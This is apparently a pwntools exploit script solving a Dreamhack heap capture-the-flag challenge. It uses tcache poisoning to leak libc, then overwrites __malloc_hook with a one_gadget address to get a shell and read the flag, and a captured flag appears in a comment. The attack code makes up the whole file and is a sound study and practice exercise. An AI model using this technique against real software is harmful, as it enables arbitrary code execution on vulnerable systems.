#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'tcache_poison_patched'
HOST = 'host3.dreamhack.games'
PORT = 10211

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x000000000040083d
b*0x000000000040086b
b*0x0000000000400879
b*0x00000000004008bf
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def alloc(size, content):
    sla(b'1. Allocate\n2. Free\n3. Print\n4. Edit\n', b'1')
    sleep(1)
    sla(b'Size: ', str(size).encode())
    sa(b'Content: ', content)
def free():
    sla(b'1. Allocate\n2. Free\n3. Print\n4. Edit\n', b'2')
def print():
    sla(b'1. Allocate\n2. Free\n3. Print\n4. Edit\n', b'3')
    rcu(b'Content: ')
def edit(content):
    sla(b'1. Allocate\n2. Free\n3. Print\n4. Edit\n', b'4')
    sa(b'Edit chunk: ', content)

alloc(0x88, b'A'*0x10)
sleep(1)

free()      
sleep(1)

edit(p64(0x601000)) # leak stdout
sleep(1)

alloc(0x88, b'B'*0x10)
sleep(1)

alloc(0x88, b'C'*0x10)
print()
rcu(b'C' * 0x10)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ec760
log.success(f'libc address: {hex(libc.address)}')
alloc(0x108, b'D'*0x10)
free()
one_gadget = libc.address + 0x10a41c
malloc_hook = libc.sym.__malloc_hook
edit(p64(malloc_hook))
alloc(0x108, b'E'*0x10)
alloc(0x108, p64(one_gadget))
sla(b'1. Allocate\n2. Free\n3. Print\n4. Edit\n', b'1')
sla(b'Size: ', b'16')
sl(b'cat flag*')

# DH{f9e02bd556d6643f11d9a83570ef5192795cf91c6b443cd603e9f83787ab02fc}
p.interactive()
